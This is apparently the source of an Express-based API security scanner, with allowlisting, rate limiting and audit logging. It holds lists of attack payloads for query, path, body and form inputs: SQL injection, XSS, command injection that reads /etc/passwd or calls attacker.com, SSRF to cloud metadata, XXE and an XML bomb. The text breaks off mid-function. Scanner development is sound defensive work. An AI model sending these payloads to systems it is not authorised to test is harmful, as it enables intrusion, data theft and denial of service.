const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");
const autocannon = require("autocannon");
const rateLimit = require("express-rate-limit");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const dns = require("dns").promises;

const app = express();
app.set("trust proxy", 1);
const PORT = process.env.PORT || 3000;
const API_KEYS = String(process.env.API_KEY || "")
  .split(",")
  .map((key) => key.trim())
  .filter(Boolean);
const API_KEY_HEADER = String(process.env.API_KEY_HEADER || "x-api-key").trim();
const API_TOKEN_TTL_MS = Number(process.env.API_TOKEN_TTL_MS || 10 * 60 * 1000);
const FETCH_TIMEOUT_MS = Number(process.env.FETCH_TIMEOUT_MS || 15000);
const TIME_DELAY_THRESHOLD_MS = Number(process.env.TIME_DELAY_THRESHOLD_MS || 2500);
const TIME_MIN_DELAY_MS = Number(process.env.TIME_MIN_DELAY_MS || 4000);
const DIFF_SIMILARITY_THRESHOLD = Number(process.env.DIFF_SIMILARITY_THRESHOLD || 0.15);
const MAX_CHAINED_TESTS = Number(process.env.MAX_CHAINED_TESTS || 12);
const AUDIT_LOG_PATH = process.env.AUDIT_LOG_PATH || path.join(__dirname, "audit.log");
const AUDIT_LOG_MAX_BYTES = Number(process.env.AUDIT_LOG_MAX_BYTES || 5 * 1024 * 1024);
const DEFAULT_ALLOWED_TARGET_HOSTS = [
  "localhost",
  "127.0.0.1",
  "::1",
  "swagger.io",
  "*.swagger.io",
  "petstore.swagger.io",
  "httpbin.org",
  "*.httpbin.org",
  "postman-echo.com",
  "*.postman-echo.com",
  "reqres.in",
  "jsonplaceholder.typicode.com",
  "*.mockapi.io",
  "*.mockbin.io",
  "webhook.site"
];
const DEFAULT_ALLOWED_HOST_KEYWORDS = ["test", "staging", "dev", "sandbox", "swagger"];
const DEFAULT_ALLOWED_ORIGINS = [
  "http://localhost:3000",
  "http://127.0.0.1:3000",
  "http://localhost:5173",
  "http://127.0.0.1:5173",
];
const STRICT_ALLOWLIST = String(process.env.STRICT_ALLOWLIST || "true").toLowerCase() === "true";
const ALLOWED_TARGET_HOSTS = String(process.env.ALLOWED_TARGET_HOSTS || "")
  .split(",")
  .map((v) => v.trim())
  .filter(Boolean);
const ALLOWED_HOST_KEYWORDS = String(process.env.ALLOWED_HOST_KEYWORDS || "")
  .split(",")
  .map((v) => v.trim())
  .filter(Boolean);
const ALLOWED_ORIGINS = String(process.env.ALLOWED_ORIGINS || "")
  .split(",")
  .map((v) => v.trim())
  .filter(Boolean);
const FOLLOW_REDIRECTS = String(process.env.FOLLOW_REDIRECTS || "false").toLowerCase() === "true";
const BAN_WINDOW_MS = Number(process.env.BAN_WINDOW_MS || 10 * 60 * 1000);
const BAN_THRESHOLD = Number(process.env.BAN_THRESHOLD || 3);
const BAN_DURATION_MS = Number(process.env.BAN_DURATION_MS || 60 * 60 * 1000);
const DAILY_TEST_LIMIT = Number(process.env.DAILY_TEST_LIMIT || 75);
const DAILY_TOKEN_LIMIT = Number(process.env.DAILY_TOKEN_LIMIT || 100);

let activeTests = 0;
const MAX_ACTIVE_TESTS = 2; 
const KEY_WINDOW_MS = 60 * 1000;
const MAX_TESTS_PER_KEY = Number(process.env.MAX_TESTS_PER_KEY || 5);
const keyHits = new Map();
const issuedTokens = new Map();
const deniedHits = new Map();
const bannedIps = new Map();
const dailyUsage = new Map();

const runTestLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 1,              // max 1 test per minute per IP
  message: { error: "Too many requests. Please try again later." }
});
const tokenIssueLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 5,
  message: { error: "Too many token requests. Please try again later." }
});

app.use(cors({
  origin: (origin, cb) => {
    if (!origin) return cb(new Error("Origin not allowed"));
    if (isOriginAllowed(origin)) return cb(null, true);
    return cb(new Error("Origin not allowed"));
  },
  credentials: true
}));
app.use(express.json({ limit: "100kb" }));

function normalizeHost(hostname) {
  return String(hostname || "").trim().toLowerCase().replace(/\.$/, "");
}

function isHostAllowed(hostname, allowList) {
  const host = normalizeHost(hostname);
  if (!host) return false;
  const list = Array.isArray(allowList) && allowList.length > 0 ? allowList : [];
  for (const entry of list) {
    const rule = normalizeHost(entry);
    if (!rule) continue;
    if (rule.startsWith("*.")) {
      const base = rule.slice(2);
      if (host.endsWith(`.${base}`)) return true;
    } else if (host === rule) {
      return true;
    }
  }
  return false;
}

function getAllowedTargetHosts() {
  return ALLOWED_TARGET_HOSTS.length > 0 ? ALLOWED_TARGET_HOSTS : DEFAULT_ALLOWED_TARGET_HOSTS;
}

function getAllowedHostKeywords() {
  return ALLOWED_HOST_KEYWORDS.length > 0 ? ALLOWED_HOST_KEYWORDS : DEFAULT_ALLOWED_HOST_KEYWORDS;
}

function getAllowedOrigins() {
  return ALLOWED_ORIGINS.length > 0 ? ALLOWED_ORIGINS : DEFAULT_ALLOWED_ORIGINS;
}

function isOriginAllowed(origin) {
  const o = String(origin || "").trim();
  if (!o) return false;
  if (o.startsWith("chrome-extension://")) return true;
  return getAllowedOrigins().some((allowed) => String(allowed || "").trim() === o);
}

function getRequestOrigin(req) {
  const origin = String(req.get("origin") || "").trim();
  if (origin) return origin;
  const referer = String(req.get("referer") || "").trim();
  if (!referer) return "";
  try {
    return new URL(referer).origin;
  } catch (e) {
    return "";
  }
}

function hostContainsKeyword(hostname) {
  const host = normalizeHost(hostname);
  if (!host) return false;
  return getAllowedHostKeywords().some((kw) => kw && host.includes(String(kw).toLowerCase()));
}

function getBaseDomain(hostname) {
  const host = normalizeHost(hostname);
  if (!host) return "";
  const parts = host.split(".").filter(Boolean);
  if (parts.length < 2) return host;
  return `${parts[parts.length - 2]}.${parts[parts.length - 1]}`;
}

function isSameDomain(hostname, swaggerHostname) {
  const host = normalizeHost(hostname);
  const swaggerHost = normalizeHost(swaggerHostname);
  if (!host || !swaggerHost) return false;
  if (host === swaggerHost || host.endsWith(`.${swaggerHost}`)) return true;
  const base = getBaseDomain(swaggerHost);
  return host === base || host.endsWith(`.${base}`);
}

async function enforceAllowedTarget(baseUrl, swaggerUrl) {
  try {
    const u = new URL(baseUrl);
    const host = u.hostname;
    if (!isLocalhostHost(host) && isPrivateNetworkHost(host)) return false;
    if (!isLocalhostHost(host)) {
      const privateResolved = await resolvesToPrivateIp(host);
      if (privateResolved) return false;
    }
    if (isHostAllowed(host, getAllowedTargetHosts())) return true;
    if (!STRICT_ALLOWLIST) {
      if (hostContainsKeyword(host)) return true;
      if (swaggerUrl) {
        const s = new URL(swaggerUrl);
        if (isSameDomain(host, s.hostname)) return true;
      }
    }
    return false;
  } catch (e) {
    return false;
  }
}

function requireApiKeyIfConfigured(req, res, next) {
  if (API_KEYS.length === 0) return next();
  const provided = String(req.get(API_KEY_HEADER) || "").trim();
  if (!API_KEYS.includes(provided)) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  const now = Date.now();
  const key = provided || "unknown";
  const bucket = keyHits.get(key) || [];
  const fresh = bucket.filter((ts) => now - ts < KEY_WINDOW_MS);
  if (fresh.length >= MAX_TESTS_PER_KEY) {
    return res.status(429).json({ error: "Too many requests for this API key. Please try again later." });
  }
  fresh.push(now);
  keyHits.set(key, fresh);
  return next();
}

function sanitizeString(s, maxLen = 1024) {
  if (s === null || s === undefined) return "";
  if (typeof s !== "string") s = String(s);
  let t = s.replace(/\0/g, "").replace(/[\x00-\x1F\x7F]/g, "").trim();
  t = t.replace(/</g, "&lt;").replace(/>/g, "&gt;");
  if (t.length > maxLen) t = t.slice(0, maxLen);
  return t;
}

function pickApiKey() {
  if (API_KEYS.length === 0) return "";
  return API_KEYS[Math.floor(Math.random() * API_KEYS.length)];
}

function generateMaskedKey() {
  return crypto.randomBytes(6).toString("base64").replace(/[^a-zA-Z0-9]/g, "").slice(0, 8);
}

function issueToken(key) {
  const token = crypto.randomBytes(24).toString("hex");
  const expiresAt = Date.now() + API_TOKEN_TTL_MS;
  const csrfToken = crypto.randomBytes(16).toString("hex");
  issuedTokens.set(token, { key, expiresAt, csrfToken, ip: null, ua: null });
  return token;
}

function pruneExpiredTokens() {
  const now = Date.now();
  for (const [token, data] of issuedTokens.entries()) {
    if (!data || data.expiresAt <= now) issuedTokens.delete(token);
  }
}

function getCookie(req, name) {
  const raw = String(req.headers?.cookie || "");
  if (!raw) return "";
  const parts = raw.split(";").map((p) => p.trim());
  for (const part of parts) {
    const eq = part.indexOf("=");
    if (eq === -1) continue;
    const k = part.slice(0, eq).trim();
    const v = part.slice(eq + 1).trim();
    if (k === name) return decodeURIComponent(v);
  }
  return "";
}

function isHttpsRequest(req) {
  if (req.secure) return true;
  const proto = String(req.get("x-forwarded-proto") || "").toLowerCase();
  return proto === "https";
}

function safeAppendAudit(entry) {
  try {
    try {
      if (fs.existsSync(AUDIT_LOG_PATH)) {
        const stat = fs.statSync(AUDIT_LOG_PATH);
        if (stat.size >= AUDIT_LOG_MAX_BYTES) {
          const stamp = new Date().toISOString().replace(/[:.]/g, "-");
          fs.renameSync(AUDIT_LOG_PATH, `${AUDIT_LOG_PATH}.${stamp}`);
        }
      }
    } catch (e) {}
    const line = JSON.stringify({ ts: new Date().toISOString(), ...entry }) + "\n";
    fs.appendFile(AUDIT_LOG_PATH, line, () => {});
  } catch (e) {
    // best-effort logging only
  }
}

function getDayKey(d = new Date()) {
  return d.toISOString().slice(0, 10);
}

function bumpDailyCounter(name, scope, limit) {
  if (!Number.isFinite(limit) || limit <= 0) return { allowed: true, count: 0 };
  const today = getDayKey();
  const scopeKey = scope ? String(scope) : "global";
  const key = `${name}:${scopeKey}:${today}`;
  const current = dailyUsage.get(key) || 0;
  if (current >= limit) return { allowed: false, count: current };
  const next = current + 1;
  dailyUsage.set(key, next);
  return { allowed: true, count: next };
}

function isDailyLimitReached(name, scope, limit) {
  if (!Number.isFinite(limit) || limit <= 0) return false;
  const today = getDayKey();
  const scopeKey = scope ? String(scope) : "global";
  const key = `${name}:${scopeKey}:${today}`;
  const current = dailyUsage.get(key) || 0;
  return current >= limit;
}

function noteDenied(ip, reason, meta = {}) {
  if (!ip) return;
  const now = Date.now();
  const bucket = deniedHits.get(ip) || [];
  const fresh = bucket.filter((ts) => now - ts < BAN_WINDOW_MS);
  fresh.push(now);
  deniedHits.set(ip, fresh);
  if (fresh.length >= BAN_THRESHOLD) {
    const until = now + BAN_DURATION_MS;
    bannedIps.set(ip, until);
    safeAppendAudit({ event: "ip_banned", ip, reason: `threshold:${reason}`, until, ...meta });
  }
}

function isIpBanned(ip) {
  if (!ip) return false;
  const until = bannedIps.get(ip);
  if (!until) return false;
  if (until <= Date.now()) {
    bannedIps.delete(ip);
    return false;
  }
  return true;
}

function isIpv4(hostname) {
  return /^\d{1,3}(\.\d{1,3}){3}$/.test(String(hostname || "").trim());
}

function isIpv6(hostname) {
  return String(hostname || "").includes(":");
}

function isPrivateIpv4(hostname) {
  if (!isIpv4(hostname)) return false;
  const parts = hostname.split(".").map((v) => Number(v));
  if (parts.some((n) => Number.isNaN(n) || n < 0 || n > 255)) return false;
  if (parts[0] === 10) return true;
  if (parts[0] === 127) return true;
  if (parts[0] === 192 && parts[1] === 168) return true;
  if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
  return false;
}

function isLocalhostHost(hostname) {
  const host = normalizeHost(hostname);
  return host === "localhost" || host === "127.0.0.1" || host === "::1";
}

function isPrivateNetworkHost(hostname) {
  const host = normalizeHost(hostname);
  if (!host) return false;
  if (isIpv4(host)) return isPrivateIpv4(host);
  if (isIpv6(host)) return host === "::1";
  return false;
}

async function resolvesToPrivateIp(hostname) {
  try {
    const results = await dns.lookup(hostname, { all: true, verbatim: true });
    return results.some((r) => isPrivateNetworkHost(r.address));
  } catch (e) {
    return false;
  }
}

async function fetchWithTimeout(url, options, timeoutMs = FETCH_TIMEOUT_MS) {
  if (typeof AbortController !== "undefined") {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const redirect = FOLLOW_REDIRECTS ? "follow" : "manual";
      return await fetch(url, { ...(options || {}), signal: controller.signal, redirect });
    } finally {
      clearTimeout(id);
    }
  }

  const redirect = FOLLOW_REDIRECTS ? "follow" : "manual";
  return await Promise.race([
    fetch(url, { ...(options || {}), redirect }),
    new Promise((_, reject) => setTimeout(() => reject(new Error("Fetch timeout")), timeoutMs)),
  ]);
}

function sanitizeObject(obj, depth = 0) {
  if (depth > 5 || obj === null || obj === undefined) return obj;
  if (typeof obj === "string") return sanitizeString(obj, 2048);
  if (typeof obj === "number" || typeof obj === "boolean") return obj;
  if (Array.isArray(obj)) return obj.slice(0, 100).map((v) => sanitizeObject(v, depth + 1));
  if (typeof obj === "object") {
    const out = {};
    for (const k of Object.keys(obj)) {
      try {
        out[k] = sanitizeObject(obj[k], depth + 1);
      } catch (e) {
        out[k] = null;
      }
    }
    return out;
  }
  return obj;
}

function isValidUrl(s) {
  try {
    const u = new URL(s);
    return ["http:", "https:"].includes(u.protocol) && s.length <= 2048;
  } catch (e) {
    return false;
  }
}

app.get("/health", (req, res) => res.json({ ok: true }));

app.post("/request-api-key", tokenIssueLimiter, (req, res) => {
  const reqOrigin = getRequestOrigin(req);
  if (!reqOrigin || !isOriginAllowed(reqOrigin)) {
    safeAppendAudit({ event: "request_api_key_denied", reason: "origin_not_allowed", ip: req.ip, origin: reqOrigin });
    return res.status(403).json({ error: "Origin not allowed." });
  }
  if (isIpBanned(req.ip)) {
    safeAppendAudit({ event: "request_api_key_denied", reason: "ip_banned", ip: req.ip });
    return res.status(403).json({ error: "Access temporarily blocked." });
  }
  if (isDailyLimitReached("token", req.ip, DAILY_TOKEN_LIMIT)) {
    safeAppendAudit({ event: "request_api_key_denied", reason: "daily_token_limit", ip: req.ip });
    return res.status(429).json({ error: "Daily token limit reached." });
  }
  pruneExpiredTokens();
  bumpDailyCounter("token", req.ip, DAILY_TOKEN_LIMIT);
  const key = pickApiKey();
  if (!key) {
    return res.status(503).json({ error: "API keys are not configured." });
  }
  const token = issueToken(key);
  const reqIp = req.ip;
  const reqUa = String(req.get("user-agent") || "").trim();
  const tokenData = issuedTokens.get(token);
  if (tokenData) {
    tokenData.ua = reqUa;
    tokenData.ip = reqIp;
  }
  const masked = generateMaskedKey();
  const secureCookie = isHttpsRequest(req);
  res.cookie("api_token", token, {
    httpOnly: true,
    secure: secureCookie,
    sameSite: secureCookie ? "None" : "Lax",
    maxAge: API_TOKEN_TTL_MS,
    path: "/",
  });
  safeAppendAudit({
    event: "token_issued",
    ip: reqIp,
    ua: reqUa,
    masked,
    ttlMs: API_TOKEN_TTL_MS,
  });
  return res.json({ masked, expiresInMs: API_TOKEN_TTL_MS, csrfToken: tokenData?.csrfToken || "" });
});

const testsByMode = {
  query: [
    { type: "Query SQLi Boolean", value: "' OR '1'='1'--" },
    { type: "Query SQLi Union Extract", value: "' UNION SELECT null,version(),user()--" },
    { type: "Query SQLi Time Delay", value: "' AND SLEEP(5)--" },
    { type: "Query SQLi Conditional Delay", value: "' AND IF(1=1,SLEEP(5),0)--" },
    { type: "Query SQLi Heavy Query", value: "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--" },

    { type: "Query XSS Script", value: "<script>alert(document.domain)</script>" },
    { type: "Query XSS SVG Polyglot", value: "\"><svg/onload=alert(1)>" },
    { type: "Query XSS IMG OnError", value: "<img src=x onerror=alert(1)>" },
    { type: "Query XSS JS URI", value: "javascript:alert(document.cookie)" },
    { type: "Query XSS Data URI", value: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" },

    { type: "Query Command Injection Semicolon", value: ";cat /etc/passwd" },
    { type: "Query Command Injection Subshell", value: "$(cat /etc/passwd)" },
    { type: "Query Command Injection Backticks", value: "`cat /etc/passwd`" },

    { type: "Query SSRF AWS Metadata", value: "http://169.254.169.254/latest/meta-data/" },
    { type: "Query SSRF Localhost", value: "http://127.0.0.1:22" },
    { type: "Query SSRF Admin Panel", value: "http://localhost:8080/admin" },

    { type: "Query LDAP Injection", value: "*)(uid=*))(|(uid=*" },
    { type: "Query Template Injection", value: "{{7*7}}" },
    { type: "Query Template Injection Advanced", value: "${{7*7}}" },

    { type: "Query NoSQL Injection", value: '{"$ne":null}' },
    { type: "Query NoSQL Regex", value: '{"$regex":".*"}' },

    { type: "Query Path Traversal", value: "../../../../../../etc/passwd" },
    { type: "Query Double Encoded Traversal", value: "..%252f..%252f..%252fetc%252fpasswd" },
    { type: "Query Unicode Traversal", value: "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" },

    { type: "Query CRLF Header Injection", value: "test%0d%0aX-Injected:true" },

    { type: "Query Protocol Smuggling", value: "gopher://127.0.0.1:11211/_stats" },

    { type: "Query Prototype Pollution", value: '{"__proto__":{"admin":true}}' },

    { type: "Query JSON Pollution", value: '{"role":"user","role":"admin"}' },

    { type: "Query Massive Length Stress", value: "A".repeat(50000) },
  ],

  path: [
    { type: "Path SQLi Boolean", value: "1' OR '1'='1'--" },
    { type: "Path SQLi Union", value: "1 UNION SELECT null,version(),null--" },
    { type: "Path SQLi Time", value: "1' AND SLEEP(5)--" },

    { type: "Path Command Injection", value: "id;whoami" },
    { type: "Path Command Pipe", value: "id|whoami" },
    { type: "Path Command Subshell", value: "$(whoami)" },

    { type: "Path Traversal Linux", value: "../../../../../../etc/passwd" },
    { type: "Path Traversal Windows", value: "..\\..\\..\\windows\\win.ini" },

    { type: "Path Double Encoded Traversal", value: "..%252f..%252f..%252fetc%252fpasswd" },
    { type: "Path Unicode Traversal", value: "%c0%ae%c0%ae%c0%afetc%c0%afpasswd" },

    { type: "Path Null Byte", value: "admin%00.json" },

    { type: "Path XSS Injection", value: "<svg/onload=alert(1)>" },

    { type: "Path Template Injection", value: "{{7*7}}" },

    { type: "Path SSRF Probe", value: "http://169.254.169.254/latest/meta-data/" },

    { type: "Path Overlong Segment", value: "X".repeat(8000) },

    { type: "Path Mixed Attack", value: "../../../../etc/passwd%00<script>alert(1)</script>" },
  ],

  body: [
    { type: "Body SQLi Auth Bypass", value: "admin' OR '1'='1'--" },
    { type: "Body SQLi Time Delay", value: "1' AND SLEEP(5)--" },
    { type: "Body SQLi Union Dump", value: "' UNION SELECT null,version(),database()--" },

    { type: "Body XSS Script", value: "<script>alert(document.cookie)</script>" },
    { type: "Body XSS SVG Polyglot", value: "\"><svg/onload=alert(1)>" },

    { type: "Body Template Injection", value: "{{constructor.constructor('alert(1)')()}}" },

    { type: "Body Command Injection", value: "test;cat /etc/passwd" },
    { type: "Body Bash Injection", value: "$(curl attacker.com)" },

    { type: "Body CRLF Header Injection", value: "test\r\nSet-Cookie:admin=true" },

    { type: "Body JSON Breakout", value: "\"},\"role\":\"admin\",\"x\":\"" },

    { type: "Body Prototype Pollution", value: '{"__proto__":{"isAdmin":true}}' },

    { type: "Body NoSQL Injection", value: '{"username":{"$ne":null}}' },

    { type: "Body XXE Injection", value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>" },

    { type: "Body XML Bomb", value: "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol1;</lolz>" },

    { type: "Body Massive JSON", value: JSON.stringify({ data: "A".repeat(60000) }) },

    { type: "Body Zip Bomb Marker", value: "PK".repeat(10000) },
  ],

  form: [
    { type: "Form SQLi Union", value: "test' UNION SELECT null,version()--" },
    { type: "Form SQLi Boolean", value: "' OR '1'='1'--" },
    { type: "Form SQLi Time Delay", value: "';WAITFOR DELAY '0:0:5'--" },

    { type: "Form XSS Polyglot", value: "\"><svg/onload=alert(1)>" },
    { type: "Form XSS Image", value: "<img src=x onerror=alert(1)>" },

    { type: "Form Template Injection", value: "{{7*7}}" },
    { type: "Form SSTI Advanced", value: "{{constructor.constructor('alert(1)')()}}" },

    { type: "Form Command Injection", value: "name=test;whoami" },
    { type: "Form Bash Injection", value: "$(whoami)" },

    { type: "Form Traversal", value: "../../../../etc/passwd" },

    { type: "Form Null Byte", value: "avatar.png%00.jpg" },

    { type: "Form CRLF Injection", value: "test%0d%0aX-Evil:1" },

    { type: "Form Protocol Smuggling", value: "gopher://127.0.0.1:11211/_stats" },

    { type: "Form Massive Input", value: "Z".repeat(50000) },
  ],
};

function buildChainedTests(tests) {
  const chained = [];
  const chainers = [
    { re: /SQLi|SQL/i, suffix: " /*chain*/ OR 1=1--" },
    { re: /Command|Bash/i, suffix: ";id" },
    { re: /XSS|Script|SVG|IMG/i, suffix: "\"><svg/onload=alert(1)>" },
    { re: /Traversal|Path/i, suffix: "/../../../../etc/passwd" },
    { re: /Template|SSTI/i, suffix: "{{7*7}}" },
    { re: /CRLF|Header/i, suffix: "%0d%0aX-Chain:1" },
  ];

  for (const test of tests || []) {
    if (chained.length >= MAX_CHAINED_TESTS) break;
    const payload = String(test?.value || "");
    if (!payload || payload.length > 2000) continue;
    const chainer = chainers.find((c) => c.re.test(String(test?.type || "")));
    if (!chainer) continue;
    const chainedValue = `${payload}${chainer.suffix}`;
    chained.push({
      type: `${test.type} + Chain`,
      value: chainedValue,
      chainedFrom: test.type,
    });
  }
  return chained;
}

function chooseMode(method, endpointContext) {
  const hasQuery = (endpointContext?.queryParams || []).length > 0;
  const hasPath = Object.keys(endpointContext?.pathParamValues || {}).length > 0;
  const hasForm = (endpointContext?.formDataParams || []).length > 0;
  const hasBody = Boolean(endpointContext?.bodyTemplate) || (endpointContext?.bodyFields || []).length > 0;

  if (hasForm) return "form";
  if (hasBody && method !== "GET" && method !== "DELETE") return "body";
  if (hasQuery) return "query";
  if (hasPath) return "path";
  return method === "GET" || method === "DELETE" ? "query" : "body";
}

function resolvePath(path, pathParams) {
  return path.replace(/\{([^}]+)\}/g, (_, key) => encodeURIComponent(pathParams[key] || "test"));
}

function joinUrl(baseUrl, path) {
  const cleanBase = String(baseUrl || "").replace(/\/+$/, "");
  const cleanPath = String(path || "").startsWith("/") ? String(path) : `/${String(path)}`;
  return `${cleanBase}${cleanPath}`;
}

function buildUrl(baseUrl, path, queryParams, value, forceProbeParam = false) {
  const target = new URL(joinUrl(baseUrl, path));
  const params = Array.isArray(queryParams) ? queryParams.slice(0, 20) : [];
  if (params.length === 0 && forceProbeParam) params.push("__probe");
  if (params.length === 0) return target.toString();
  const payloadValue = typeof value === "string" ? value : JSON.stringify(value);
  params.forEach((name) => target.searchParams.set(name, payloadValue));
  return target.toString();
}

function deepClone(value) {
  return value === null || value === undefined ? value : JSON.parse(JSON.stringify(value));
}

function setByPath(obj, path, value) {
  if (!obj || !path) return;
  const keys = path.split(".");
  let cursor = obj;
  for (let i = 0; i < keys.length - 1; i++) {
    const key = keys[i];
    if (!cursor[key] || typeof cursor[key] !== "object") cursor[key] = {};
    cursor = cursor[key];
  }
  cursor[keys[keys.length - 1]] = value;
}

function buildMultipartBody(formParams, value) {
  const boundary = `----codex-boundary-${Date.now()}`;
  const lines = [];
  const fields = formParams || [];
  fields.forEach((field, idx) => {
    const currentValue = sanitizeString(idx === 0 ? value : "test", 4096);
    const safeName = sanitizeString(field?.name || "field", 128).replace(/[^a-zA-Z0-9_\-\.]/g, "_");
    lines.push(`--${boundary}`);
    if (field.type === "file") {
      lines.push(`Content-Disposition: form-data; name="${safeName}"; filename="test.txt"`);
      lines.push("Content-Type: text/plain");
      lines.push("");
      lines.push(String(currentValue));
    } else {
      lines.push(`Content-Disposition: form-data; name="${safeName}"`);
      lines.push("");
      lines.push(String(currentValue));
    }
  });
  lines.push(`--${boundary}--`, "");
  return { body: lines.join("\r\n"), contentType: `multipart/form-data; boundary=${boundary}` };
}

function buildRequest(method, mode, testValue, endpointContext) {
  const options = { method, headers: { "Content-Type": "application/json" } };
  if (mode === "form") {
    const form = buildMultipartBody(endpointContext?.formDataParams || [], testValue);
    options.headers["Content-Type"] = form.contentType;
    options.body = form.body;
    return options;
  }

  if (mode === "body" && method !== "GET" && method !== "DELETE") {
    const template = deepClone(endpointContext?.bodyTemplate);
    if (template && typeof template === "object" && !Array.isArray(template)) {
      const fieldPath = endpointContext?.injectFieldPath || endpointContext?.bodyFields?.[0] || null;
      setByPath(template, fieldPath, testValue);
      options.body = JSON.stringify(template);
    } else {
      const field = endpointContext?.bodyFields?.[0];
      options.body = JSON.stringify(field ? { [field]: testValue } : testValue);
    }
  }

  return options;
}

function normalizeBody(text) {
  return String(text || "").replace(/\s+/g, " ").trim().slice(0, 5000);
}

function tokenizeForDiff(text) {
  return String(text || "")
    .toLowerCase()
    .match(/[a-z0-9_]+/g) || [];
}

function computeJaccardSimilarity(aTokens, bTokens) {
  if (aTokens.length === 0 && bTokens.length === 0) return 1;
  const aSet = new Set(aTokens);
  const bSet = new Set(bTokens);
  let intersection = 0;
  for (const t of aSet) {
    if (bSet.has(t)) intersection++;
  }
  const union = aSet.size + bSet.size - intersection;
  return union === 0 ? 1 : intersection / union;
}

function computeSimilarityScore(aText, bText) {
  const aNorm = normalizeBody(aText);
  const bNorm = normalizeBody(bText);
  if (aNorm === bNorm) return 1;
  const aTokens = tokenizeForDiff(aNorm);
  const bTokens = tokenizeForDiff(bNorm);
  return computeJaccardSimilarity(aTokens, bTokens);
}

function collectJsonPaths(value, prefix = "", depth = 0, out = []) {
  if (depth > 6) return out;
  if (value === null || value === undefined) {
    out.push(prefix || "$");
    return out;
  }
  if (Array.isArray(value)) {
    out.push(`${prefix || "$"}[]`);
    value.slice(0, 50).forEach((v, i) => collectJsonPaths(v, `${prefix || "$"}[${i}]`, depth + 1, out));
    return out;
  }
  if (typeof value === "object") {
    const keys = Object.keys(value).sort();
    if (keys.length === 0) out.push(`${prefix || "$"}{}`);
    for (const k of keys) {
      const next = prefix ? `${prefix}.${k}` : k;
      out.push(next);
      collectJsonPaths(value[k], next, depth + 1, out);
    }
    return out;
  }
  out.push(`${prefix || "$"}:${typeof value}`);
  return out;
}

function summarizeJsonStructure(value) {
  if (value === null || value === undefined) return "null";
  if (Array.isArray(value)) {
    if (value.length === 0) return "[]";
    return `[${summarizeJsonStructure(value[0])}]`;
  }
  if (typeof value === "object") {
    const keys = Object.keys(value).sort();
    return `{${keys.map((k) => `${k}:${summarizeJsonStructure(value[k])}`).join(",")}}`;
  }
  return typeof value;
}

function diffJsonKeys(a, b) {
  const aKeys = new Set(collectJsonPaths(a));
  const bKeys = new Set(collectJsonPaths(b));
  const added = [];
  const removed = [];
  for (const k of bKeys) if (!aKeys.has(k)) added.push(k);
  for (const k of aKeys) if (!bKeys.has(k)) removed.push(k);
  return { added: added.slice(0, 50), removed: removed.slice(0, 50), addedCount: added.length, removedCount: removed.length };
}

function computeResponseDiff(baselineText, responseText) {
  const baseNorm = normalizeBody(baselineText);
  const respNorm = normalizeBody(responseText);
  const similarity = computeSimilarityScore(baseNorm, respNorm);
  const baselineLength = baseNorm.length;
  const responseLength = respNorm.length;
  const lengthDelta = responseLength - baselineLength;

  const baseJson = tryParseJson(baselineText);
  const respJson = tryParseJson(responseText);
  const baseStruct = baseJson ? summarizeJsonStructure(stripVolatileFields(baseJson)) : null;
  const respStruct = respJson ? summarizeJsonStructure(stripVolatileFields(respJson)) : null;
  const structChanged = baseStruct && respStruct ? baseStruct !== respStruct : null;
  const keyDiff = baseJson && respJson ? diffJsonKeys(stripVolatileFields(baseJson), stripVolatileFields(respJson)) : null;

  return {
    similarityPct: Number((similarity * 100).toFixed(1)),
    baselineLength,
    responseLength,
    lengthDelta,
    structureChanged: structChanged,
    keyDiff,
    changed: similarity < 0.98 || lengthDelta !== 0 || structChanged === true || (keyDiff && (keyDiff.addedCount > 0 || keyDiff.removedCount > 0)),
  };
}

function getInvalidProbeValue(mode) {
  const base = "!!INVALID!!@@@";
  if (mode === "path") return `${base}/..`;
  return base;
}

function safeDecode(value) {
  try {
    return decodeURIComponent(String(value || ""));
  } catch (e) {
    return String(value || "");
  }
}

function escapeForHtmlProbe(value) {
  return String(value || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function looksReflected(responseText, value) {
  const body = String(responseText || "");
  if (!body) return false;
  const raw = String(value || "");
  const decoded = safeDecode(raw);
  const htmlEscaped = escapeForHtmlProbe(raw);
  const htmlEscapedDecoded = escapeForHtmlProbe(decoded);
  return [raw, decoded, htmlEscaped, htmlEscapedDecoded]
    .filter((v) => v && v.length > 0)
    .some((candidate) => body.includes(candidate));
}

function looksEscapedReflection(responseText, value) {
  const body = String(responseText || "");
  if (!body) return false;
  const raw = String(value || "");
  const decoded = safeDecode(raw);
  const escapedRaw = escapeForHtmlProbe(raw);
  const escapedDecoded = escapeForHtmlProbe(decoded);
  const hasRaw = [raw, decoded].filter((v) => v && v.length > 0).some((v) => body.includes(v));
  const hasEscaped = [escapedRaw, escapedDecoded].filter((v) => v && v.length > 0).some((v) => body.includes(v));
  return !hasRaw && hasEscaped;
}

function hasSqlErrorMarkers(responseText) {
  const text = String(responseText || "").toLowerCase();
  const markers = [
    "sql syntax",
    "syntax error",
    "mysql",
    "postgres",
    "sqlstate",
    "ora-",
    "odbc",
    "sqlite error",
    "unclosed quotation mark",
  ];
  return markers.some((m) => text.includes(m));
}

function isExplicitBlockStatus(statusCode) {
  return [400, 401, 403, 404, 405, 406, 409, 410, 411, 412, 413, 414, 415, 416, 422, 429, 431].includes(Number(statusCode));
}

function hasTimeInjectionMarker(value) {
  const s = String(value || "").toLowerCase();
  return s.includes("sleep(") || s.includes("waitfor delay") || s.includes("pg_sleep(") || s.includes("benchmark(");
}

function buildVerdict({ status, findingType, severity, note, message }) {
  return { status, findingType, severity, note, message };
}

function hasSuspiciousMarkers(value) {
  const s = String(value || "").toLowerCase();
  const patterns = [
